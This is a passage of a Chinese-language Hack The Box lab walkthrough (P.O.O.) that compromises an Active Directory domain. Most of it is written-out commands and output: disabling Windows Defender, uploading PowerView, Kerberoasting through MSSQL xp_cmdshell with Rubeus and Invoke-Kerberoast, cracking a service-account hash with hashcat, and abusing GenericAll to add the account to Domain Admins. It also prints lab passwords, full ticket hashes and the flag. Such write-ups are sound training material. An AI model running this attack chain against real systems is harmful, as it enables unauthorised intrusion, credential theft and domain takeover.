+ <font style="color:rgb(13, 13, 13);">极可能是：</font>
    - <font style="color:rgb(13, 13, 13);">Domain Admin</font>
    - <font style="color:rgb(13, 13, 13);">或等价权限</font>

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只要密码一爆 = 直接拿域</font>**

---

### <font style="color:rgb(13, 13, 13);">④ 密码特性非常“HTB 风格”</font><font style="color:rgb(13, 13, 13);">😈</font>
```plain
Password Never Expires: TRUE
Password Last Set: 2018-05-11
```

<font style="color:rgb(13, 13, 13);">翻译一下：</font>

+ <font style="color:rgb(13, 13, 13);">8 年没换密码</font>
+ <font style="color:rgb(13, 13, 13);">服务账号</font>
+ <font style="color:rgb(13, 13, 13);">绑定 SPN</font>

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">99% 是弱口令 / 可爆</font>**

## <font style="color:rgb(193, 132, 1);background-color:rgb(249, 249, 249);">Invoke-Kerberoast</font><font style="color:rgb(56, 58, 66);background-color:rgb(249, 249, 249);">.ps1</font>
## 上传PowerView.ps1（失败）
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/PowerSploit/Recon/PowerView.ps1 PowerView.ps1 
                                        
Info: Uploading /home/kali/Desktop/htb/poo/../../tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\Administrator\Documents\PowerView.ps1                                   
                                        
Data: 482560 bytes of 482560 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/3/2026   5:27 PM              0 PowerView.ps1


```

>  PowerView.ps1 实际已经被成功上传过，但在“落盘阶段被清空了内容”  
>
>  Defender / AMSI / AV 在你写文件的瞬间“消毒”了 🧼（**最常见**）  
>

## 关闭windows defender
```plain
Set-MpPreference -DisableRealtimeMonitoring $true
```

## 重新上传并执行
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/PowerSploit/Recon/PowerView.ps1 PowerView.ps1 
                                        
Info: Uploading /home/kali/Desktop/htb/poo/../../tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\Administrator\Documents\PowerView.ps1                                   
                                        
Data: 482560 bytes of 482560 bytes copied
                                        
Info: Upload successful!
dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/3/2026   5:30 PM         361920 PowerView.ps1

*Evil-WinRM* PS C:\Users\Administrator\Documents> Import-Module .\PowerView.ps1
 
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Kerberoast
 
The term 'Invoke-Kerberoast' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Invoke-Kerberoast
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-Kerberoast:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

```

压根就不支持

## Rubeus
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Rubeus.exe kerberoast /spn:MSSQLSvc/DC.intranet.poo:1433 /outfile:hash.txt
 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.


[*] Target SPN             : MSSQLSvc/DC.intranet.poo:1433

 [X] Error during request for SPN MSSQLSvc/DC.intranet.poo:1433 : No credentials are available in the security package

[*] Roasted hashes written to : C:\Users\Administrator\Documents\hash.txt
```

```plain
[X] No credentials are available in the security package
```

> <font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">意思是：</font>**
>
> **<font style="color:rgb(13, 13, 13);">当前 Windows 会话里</font>****<font style="color:rgb(13, 13, 13);"> </font>****没有任何 Kerberos TGT**
>
> **<font style="color:rgb(13, 13, 13);">所以</font>****<font style="color:rgb(13, 13, 13);"> </font>****Rubeus 没法向 KDC 要 TGS**
>
> **<font style="color:rgb(13, 13, 13);">👉</font>****<font style="color:rgb(13, 13, 13);"> Kerberoast 自然失败</font>**
>
> **<font style="color:rgb(13, 13, 13);">我们拿到的Administrator 是：</font>**
>
> + <font style="color:rgb(13, 13, 13);">本地管理员 / NTLM 登录</font>
> + <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">不是域 Kerberos 交互登录</font>**
> + <font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> 内存里没有 </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">krbtgt</font>**`<font style="color:rgb(13, 13, 13);"> 票据</font>
>

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> klist

Current LogonId is 0:0x840f5

Cached Tickets: (0)
```

**<font style="color:rgb(13, 13, 13);"></font>**

## Invoke-Kerberoast.ps1
### Administrator
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> Import-Module .\Invoke-Kerberoast.ps1 -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Kerberoast -OutputFormat Hashcat

Exception calling "FindAll" with "0" argument(s): "The specified domain either does not exist or could not be contacted.
"

At C:\Users\Administrator\Documents\Invoke-Kerberoast.ps1:990 char:20

+             else { $Results = $UserSearcher.FindAll() }

+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException

    + FullyQualifiedErrorId : DirectoryServicesCOMException

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

<font style="color:rgb(13, 13, 13);">⚠️</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">Administrator ≠ 一定是域管理员</font>**

<font style="color:rgb(13, 13, 13);">很多靶机里：</font>

+ `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">Administrator</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">本地管理员</font>**
+ <font style="color:rgb(13, 13, 13);">不属于</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">DOMAIN\Administrator</font>**`

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">Invoke‑Kerberoast 必须是域用户</font>**

### <font style="color:rgb(13, 13, 13);">mssql</font>
```plain
*Evil-WinRM* PS C:\Users\Public\Downloads> upload ../../tools/Invoke/Invoke-Kerberoast.ps1 Invoke-Kerberoast.ps1                                 
Info: Uploading /home/kali/Desktop/htb/poo/../../tools/Invoke/Invoke-Kerberoast.ps1 to C:\Users\Public\Downloads\Invoke-Kerberoast.ps1                                     
Data: 62464 bytes of 62464 bytes copied
Info: Upload successful!


┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ impacket-mssqlclient intranet.poo/god:1qaz@wsx@10.13.38.11
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017  (14.0.2056)
[!] Press help for extra shell commands
SQL (god  dbo@master)>


SQL (god  dbo@master)> xp_cmdshell powershell -c import-module C:\Users\Public\Downloads\Invoke-Kerberoast.ps1; invoke-kerberoast -outputformat hashcat
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
NULL                                                                               
TicketByteHexStream  :                                                             
Hash                 : $krb5tgs$23$*p00_hr$intranet.poo$HR_peoplesoft/intranet.poo:1433*$B37F8EC697E50E568021EC1E123DD8   
                       20$217AD9F9B947656BFAC4220A660D966A41F1FBE9AC134DEFD30A9DC5504A6575BFD614362343D83C418838716C9B2   
                       A18098F23E1EB4BC7F2E5492400BB1D96904F4B33112561B6EFEC47052309F91ABEAB079C90EC9649CAA5742B8C47F04   
                       0A92502350F2446514B32BAD25ECCF56A9832FC3CCDD9870F00E78B127582BCE68BF6D15F4A2FAEA2F40EB86F06B9E13   
                       13A3F2308409D5E27D69C92CEBA872A33CFCE4A722539E2D207261412D3643A0C9A83554A485758B84610070C1EA4231   
                       7F46DAA0D816011E3FA6CD5EDAC5EFCDD43A299DC8C2A09BF2ABEBC42CB85C1227C00713391AFC885479659CAEC14190   
                       0CF27608DC3212509D6F7CC2629E3E570C2975B68EA3BA3802B4E92C56308C58529351F1CE9CF4F1272513B6F9EBF56E   
                       10DBAE5A40324F58E93302DCA41132CB6AE94E656B7F613D96557BB55C6CA41FA04543496826B577258440112A59FF9B   
                       51439503C2DB6CA9E66DA57A6DB0B45F35661AD146EF8424F74F6EB522B6A3B71E251BAE28491A7F0E05A433BA8295F2   
                       2FE66B35515E89EADFADE2701F9ABD4997E50FC1DF3F846750D326950DBD3166B56EEF428AA02564943124A4B1C7DA98   
                       04EEC71F03DD84A889FB2EE9CEBFD2A8F84FF6E3DC93D85A291F9A784AE423C423DAEC5AF5B241E05530AE5E98C32975   
                       274A47743A29E03912C65B2F95F01FF1E7AC90C59E667C4FE70653EEEE0FF0F131764055305A389FF208DB7483B55121   
                       79A8CC856E375CACD602DB592412266AC78CDAFFDAFC90C596A7DBCA08542A475AB9BAB281B81750F04B020FF3D1E7C8   
                       F3679F6A8D9DC3A7F9946DF387395A82CF15C07CDAE002D94AA525E0CABD52400BF69E0AB922BAE72FEB4BC70F0AB4A5   
                       EEB00865C0F3ECE1560D2F75A7029FD324EA06C0174A55AEC85870363C3EE5DC4A0CB63783D8045ED74AFAA855C8871A   
                       0732FFFBEF16F0A88251A29F30E1119D96DA4F08FE1567F2CBCAABB96D6FE69C276781F1A4A55790EC4B07B4D92CF483   
                       67B250819DB573471C7196851981E17492BDCF52FCEFDED74466D48BA9ADB5329AC83AF602A3A8891145F76F05B81AE6   
                       F591B921B40C2076127E8BB191662D372FF5406E6EA30BB9E07A0A3D1FC444D00F21B38C385E5660AB27C31B3D92F5DE   
                       516A429949C9D0C15A33865851C5D1416C4EB0B474032FB65617858FA4A1C0A6F0A3F0B5EB1DBBD6E507528E5C0B714C   
                       D77068D6752B566AFF417BACB99AEF0E3775FFAB1701B9D8E1938C7675FBEE43B9AE9D3D3FA6E03E30CFFB7A914A81DC   
                       09460C16E9965F18E292BBAA2074A71FC8B34CBF82490FEF9DCD93F07448E6F42E364A216D96245BB282363EA16E4CB0   
                       2CB5BF1954169F7E5C50959671A7E69D8AE7CD5F4E32B44225848FB0D6CC98FD99F0FBBFF6B1CDB04B58676A6A80A512   
                       0C1984DB890B242E0A0E5A6DCCD7A96708D6C97E14FE82773EE6FEAD1882CA831C57BD9CF9D6569C1D139747E1D624A9   
                       353C80F45025D49CA8FB7AD60E0C0534FF441007C32329B5024AC0ABD8D9A35E445C493A42D8F64D7DDEF0BCB9448A63   
                       70FE775226BBBE4A2911AD738BBD8FD8B9114A336DDE1D0EFB0C0BAA65062D4C7D920C92CA5F9B230836F78A22AD087B   
                       F4A973AE202266CCDF70282707E805894DAF5868380625F34AF60F5CF4DD573AF251ACD81B2069D33E0FC33685163   
SamAccountName       : p00_hr                                                      
DistinguishedName    : CN=p00_hr,CN=Users,DC=intranet,DC=poo                       
ServicePrincipalName : HR_peoplesoft/intranet.poo:1433                             
NULL                                                                               
TicketByteHexStream  :                                                             
Hash                 : $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$53BEC39D1B569229FF73FE3F6B9494A3   
                       $E1F760C628D4C6F10F2A78663CDAF9E9D89BD0AE5A93F65F7AB5FF3E3199340669953CA10BCD4B2426E4413511DA809   
                       EE1C399CF6BA9F34B5E185691674CB2BA45839671F54F0E2D85C9EF5B5BCB840CDA51877E708AEDA618E258E69EC529E   
                       BEBD6129DF1411B8A21A235FDA4ED23A1BE23E4AF611574D868112ECF13F576B955EA0EB15C92BCD7C951CB7A9D456CD   
                       AD53F5B2B0E065C703E69994D9414D39105BC0D02E277437641E2261BF40F998896D4F3D7418A9F1F444B7E178F9D975   
                       DA4AEB115F1173D809DD5578B827784ADF4CAE89AF15328BA29527382831E937C84557B1EEFE4D46331E94BF26462C63   
                       242C402FEC529661E5B51AC48694B4C1EFB6B8420F0070875E366CA67846D87329E3EE91F268ABE527D08C0F3C38A6E2   
                       11DF2CD890DB2F1730CF739C21B378A61B309310C4AD7DD25BF6CC874F9171603A20A5DF6F2E384B8F76145CAD0B55FF   
                       580EFCB7E1D35FCA690AE4FA60B9F5FD7495D6F20F561A75891F85CF35B3FBE2166B5D28EB8CD8A6B5A616C905F435F8   
                       7303F1E73C8086C7AA25FEA154341CBEA0543C91808BA37F589F80E3F0716272EFF588DE3EF8689A85EFDEC6CF9FB4DB   
                       8F976416C366B4FD587E5A872B6FA0CF73AF60E126B098735BE92C856AC41941821D05177C1F8A569C768289F104748C   
                       73CB7316BB5D98A76299C2CBA4209EF0472454DBCE118A240159D96206D56BC8BE28097ECCB8201089C9F1BDCABB5EBA   
                       BF6F23156F3992C356B94B3E20E417C9BA3249CADCEA6F026BD9F91FF4DAF11F481C137DB694C8E59F37767B7B94080C   
                       3D053B42B0C82B6733CD8EAA728082ADF3D20647D3B334B3C851D39968E1126F1BF827CEB8386068A1CAE923F05A1734   
                       CADAE44E9C4DC93D0121B937C447FE477D85CE0F3DB5026F93E442E3D3CAC39B6E32DCEA0D2136B974559B1803781FD9   
                       D9BF80521A143D2594BABF8D4111CCB86CA42ED566E587C073990B616F75A4A9B9A040AF4130ADF0D5640B7DBDC5A680   
                       5D6980C44C8AFD70B5442068A8F58B8EEB7B2C18197764BCBED51C8EC359EC5CDF62BB347D745501108BCA7E54DBC9E8   
                       470FC14ECE509A19AAC05EC39B065A28977FEDC71761F238140489A664B697AB986E0FB7DF2B50B5074150A95EC69795   
                       F04701BDB429C661CB47F0513F12F8002B4AF39D59077F9F8BB446BF2832CC4129D78FD3050D57B764BA7DA9EC808345   
                       714B82FCCF821C6FBECF0FB429140A5984CC53C9FDDBF0063EE6CF74769F718D57AAEE4C16E93A8FC054AB095CD1AF4D   
                       5ACB51B55466E37D30C87E66FCB637E620C6C77FDDFF2B2E590022932E16158FDB771F1D9173525B7271470C00EDBB41   
                       EA0C69D97623FE76144C84C57B5F957ED6493174EE367E410FF9D54A40670FB94D632A43F404A0D74B7187F25BC6034D   
                       F7B6BCC49AC29BBC64EA54CA90C7D7D71D5ECFD8B63812B4D606FF2B5156298BB9DC2701561191B8F514D62DFDF18945   
                       ACC15ED6404C3D2D8894925A8CC68CCF31D72C15E4B2ADDAA509E94CB83E98586FFF8C136024F7985F22D922409B8A0E   
                       2E3F5A6140AC67B1F9D55139BC8CD5CBDC02143FD6FEBED2BD30030D8BB52ED82DAE932397835F1FEFCD97FEE6DCC1CD   
                       D2006D64694377795E9AB503CEB60277695B76D9E2C73B47B09DE6719A70158A71EAF8FEC0BE2FD27B91DF16D7E   
SamAccountName       : p00_adm                                                     
DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo                      
ServicePrincipalName : cyber_audit/intranet.poo:443                                
NULL                                                                               
NULL                                                                               
NULL                                                                               
NULL
```

## p00_adm
### rockyou.txt
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/poo]
└─# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!                                                 
This can hide serious problems and should only be done when debugging.                                            
Do not report hashcat issues encountered when using --force.                                                      

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Comparing hashes with potfile entries. Please be patient.Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.                                      
If you want to switch to optimized kernels, append -O to your commandline.                                        
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing device kernels and memory. Please be patientInitializing backend runtime for device #1. Please be patHost memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                         [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                         Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).                                    

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.                                         
  Typical scenarios are a small wordlist but a large ruleset.                                                     

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:                                               
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                         Approaching final keyspace - workload adjusted.

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                         Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intra...f16d7e
Time.Started.....: Wed Feb  4 00:20:18 2026, (9 secs)
Time.Estimated...: Wed Feb  4 00:20:27 2026, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1761.0 kH/s (0.80ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 72%

Started: Wed Feb  4 00:20:05 2026
Stopped: Wed Feb  4 00:20:28 2026

```

### Keyboard-Combinations.txt
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/poo]
└─# hashcat -m 13100 hash /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Comparing hashes with potfile entries. Please be patient.Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.                                      
If you want to switch to optimized kernels, append -O to your commandline.                                        
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing device kernels and memory. Please be patientInitializing backend runtime for device #1. Please be patHost memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
* Passwords.: 9608
* Bytes.....: 84528
* Keyspace..: 9608
* Runtime...: 0 secs

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                         
$krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$53bec39d1b569229ff73fe3f6b9494a3$e1f760c628d4c6f10f2a78663cdaf9e9d89bd0ae5a93f65f7ab5ff3e3199340669953ca10bcd4b2426e4413511da809ee1c399cf6ba9f34b5e185691674cb2ba45839671f54f0e2d85c9ef5b5bcb840cda51877e708aeda618e258e69ec529ebebd6129df1411b8a21a235fda4ed23a1be23e4af611574d868112ecf13f576b955ea0eb15c92bcd7c951cb7a9d456cdad53f5b2b0e065c703e69994d9414d39105bc0d02e277437641e2261bf40f998896d4f3d7418a9f1f444b7e178f9d975da4aeb115f1173d809dd5578b827784adf4cae89af15328ba29527382831e937c84557b1eefe4d46331e94bf26462c63242c402fec529661e5b51ac48694b4c1efb6b8420f0070875e366ca67846d87329e3ee91f268abe527d08c0f3c38a6e211df2cd890db2f1730cf739c21b378a61b309310c4ad7dd25bf6cc874f9171603a20a5df6f2e384b8f76145cad0b55ff580efcb7e1d35fca690ae4fa60b9f5fd7495d6f20f561a75891f85cf35b3fbe2166b5d28eb8cd8a6b5a616c905f435f87303f1e73c8086c7aa25fea154341cbea0543c91808ba37f589f80e3f0716272eff588de3ef8689a85efdec6cf9fb4db8f976416c366b4fd587e5a872b6fa0cf73af60e126b098735be92c856ac41941821d05177c1f8a569c768289f104748c73cb7316bb5d98a76299c2cba4209ef0472454dbce118a240159d96206d56bc8be28097eccb8201089c9f1bdcabb5ebabf6f23156f3992c356b94b3e20e417c9ba3249cadcea6f026bd9f91ff4daf11f481c137db694c8e59f37767b7b94080c3d053b42b0c82b6733cd8eaa728082adf3d20647d3b334b3c851d39968e1126f1bf827ceb8386068a1cae923f05a1734cadae44e9c4dc93d0121b937c447fe477d85ce0f3db5026f93e442e3d3cac39b6e32dcea0d2136b974559b1803781fd9d9bf80521a143d2594babf8d4111ccb86ca42ed566e587c073990b616f75a4a9b9a040af4130adf0d5640b7dbdc5a6805d6980c44c8afd70b5442068a8f58b8eeb7b2c18197764bcbed51c8ec359ec5cdf62bb347d745501108bca7e54dbc9e8470fc14ece509a19aac05ec39b065a28977fedc71761f238140489a664b697ab986e0fb7df2b50b5074150a95ec69795f04701bdb429c661cb47f0513f12f8002b4af39d59077f9f8bb446bf2832cc4129d78fd3050d57b764ba7da9ec808345714b82fccf821c6fbecf0fb429140a5984cc53c9fddbf0063ee6cf74769f718d57aaee4c16e93a8fc054ab095cd1af4d5acb51b55466e37d30c87e66fcb637e620c6c77fddff2b2e590022932e16158fdb771f1d9173525b7271470c00edbb41ea0c69d97623fe76144c84c57b5f957ed6493174ee367e410ff9d54a40670fb94d632a43f404a0d74b7187f25bc6034df7b6bcc49ac29bbc64ea54ca90c7d7d71d5ecfd8b63812b4d606ff2b5156298bb9dc2701561191b8f514d62dfdf18945acc15ed6404c3d2d8894925a8cc68ccf31d72c15e4b2addaa509e94cb83e98586fff8c136024f7985f22d922409b8a0e2e3f5a6140ac67b1f9d55139bc8cd5cbdc02143fd6febed2bd30030d8bb52ed82dae932397835f1fefcd97fee6dcc1cdd2006d64694377795e9ab503ceb60277695b76d9e2c73b47b09de6719a70158a71eaf8fec0be2fd27b91df16d7e:ZQ!5t4r                                                          

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intra...f16d7e
Time.Started.....: Wed Feb  4 00:24:47 2026 (0 secs)
Time.Estimated...: Wed Feb  4 00:24:47 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1084.0 kH/s (0.99ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/9608 (21.32%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/9608 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: zaq1zaq1 -> qwer*I&U
Hardware.Mon.#1..: Util: 25%

Started: Wed Feb  4 00:24:44 2026
Stopped: Wed Feb  4 00:24:49 2026
```

成功拿到密码ZQ!5t4r

# 域
环境重置了

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> net use \\DC.intranet.poo\c$ /u:intranet.poo\p00_adm 'ZQ!5t4r'
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.
```

##  GenericAll  
![](/image/prolabs/P.O.O-8.png)

> 可以看到 P00_ADM@INTRANET.POO 是 P00 HELP DESK@INTRANET.POO 的成员，而 P00 HELP DESK@INTRANET.POO 又拥有 GenericAll 对 DOMAIN ADMINS@INTRANET.POO 的访问权限：
>

现在我可以使用 p00_adm 的帐户并将其添加到域管理员组。我将上传 `PowerView.ps1` 并导入它：

## 添加域管理
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> Import-Module .\powerview.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> $pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> $cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> net use \\DC.intranet.poo\c$ /u:intranet.poo\p00_adm 'ZQ!5t4r'
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir \\DC.intranet.poo\c$\users\


    Directory: \\DC.intranet.poo\c$\users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/15/2018   1:20 AM                Administrator
d-----        3/15/2018  12:38 AM                mr3ks
d-r---       11/21/2016   3:24 AM                Public

现在我可以拿到旗帜了，我在 mr3ks 的桌面上找到了它：

*Evil-WinRM* PS C:\Users\Administrator\Documents> type \\DC.intranet.poo\c$\users\mr3ks\desktop\flag.txt
POO{1196ef8bc523f084ad1732a38a0851d6}
```





